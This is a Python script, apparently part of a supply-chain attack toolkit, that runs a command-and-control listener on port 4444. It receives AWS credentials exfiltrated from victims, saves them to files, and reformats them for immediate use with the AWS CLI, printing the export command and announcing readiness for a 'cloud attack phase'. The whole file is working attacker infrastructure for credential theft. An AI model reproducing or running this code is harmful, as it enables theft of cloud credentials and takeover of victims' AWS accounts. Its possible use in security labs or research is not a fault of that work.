#!/usr/bin/env python3
"""
Standalone C2 Listener
Receives stolen credentials ONLY (no PyPI server)
"""
import socket
import datetime
import sys


class C2Handler:
    """Handles incoming stolen credentials"""
    
    def __init__(self, port=4444):
        self.port = port
        self.stolen_creds = []
        
    def start(self):
        """Start C2 listener for credential exfiltration"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", self.port))
        server.listen(5)
        
        print(f"[C2] Credential receiver listening on port {self.port}")
        print("[C2] Waiting for stolen AWS credentials...")
        print()
        
        while True:
            try:
                client, addr = server.accept()
                print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
                
                data = client.recv(8192).decode('utf-8', errors='ignore')
                
                if data.startswith("STOLEN_AWS_CREDS:"):
                    self.handle_stolen_creds(data, addr[0])
                
                client.close()
            except Exception as e:
                print(f"[-] Error handling connection: {e}")
    
    def handle_stolen_creds(self, data, source_ip):
        """Process and save stolen AWS credentials"""
        creds = data.replace("STOLEN_AWS_CREDS:", "")
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        print(f"[+] AWS Credentials stolen from {source_ip}!")
        print("[+] Extracting access keys...")
        
        # Save raw credentials
        raw_file = f"stolen_creds_{timestamp}_{source_ip}.txt"
        with open(raw_file, "w") as f:
            f.write(f"Source: {source_ip}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write("=" * 60 + "\n")
            f.write(creds)
        
        print(f"[+] Raw credentials saved: {raw_file}")
        
        # Parse and prepare for AWS CLI
        try:
            if "[CREDENTIALS]" in creds:
                # Split and handle both formats
                parts = creds.split("[CREDENTIALS]")
                if len(parts) > 1:
                    creds_section = parts[1]
                    # Remove [CONFIG] and [ENVIRONMENT] sections if present
                    if "[CONFIG]" in creds_section:
                        creds_section = creds_section.split("[CONFIG]")[0]
                    if "[ENVIRONMENT]" in creds_section:
                        creds_section = creds_section.split("[ENVIRONMENT]")[0]
                    
                    # Clean up the section
                    creds_section = creds_section.strip()
                    
                    # Save in AWS credentials format
                    aws_creds_file = "stolen_aws_credentials"
                    with open(aws_creds_file, "w") as f:
                        f.write(creds_section)
                    
                    print(f"[+] AWS credentials ready: {aws_creds_file}")
                    print("[+] Use with: export AWS_SHARED_CREDENTIALS_FILE=$(pwd)/stolen_aws_credentials")
                    
                    # Extract access key for logging
                    for line in creds_section.split('\n'):
                        if 'aws_access_key_id' in line.lower() and '=' in line:
                            parts = line.split('=')
                            if len(parts) >= 2:
                                key_id = parts[1].strip()
                                print(f"[+] Access Key ID: {key_id}")
                                break
                
                self.stolen_creds.append({
                    'timestamp': timestamp,
                    'source_ip': source_ip,
                    'file': raw_file
                })
                
                print("\n[SUCCESS] Credentials ready for cloud attack phase!")
                print("=" * 60)
                print()
                
        except Exception as e:
            print(f"[-] Error parsing credentials: {e}")


def main():
    """Start standalone C2 listener"""
    print("=" * 60)
    print("  STANDALONE C2 CREDENTIAL LISTENER")
    print("=" * 60)
    print()
    
    # Start C2 listener
    c2 = C2Handler(port=4444)
    c2.start()


if __name__ == "__main__":
    main()
